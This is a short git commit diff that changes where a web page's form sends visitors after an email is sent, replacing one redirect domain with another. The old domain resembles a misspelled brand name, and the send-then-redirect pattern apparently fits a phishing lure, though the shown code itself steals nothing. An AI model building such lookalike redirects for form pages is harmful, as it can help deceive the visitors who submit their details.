5b00f1b8d739d85f18f4b4ade84d1a05e16a6288
husknet <127146284+husknet@users.noreply.github.com>
2025-01-10 15:30:20 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tbon.biggreeneegg.com';
+        window.location.href = 'https://sgg.achemsite.info';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
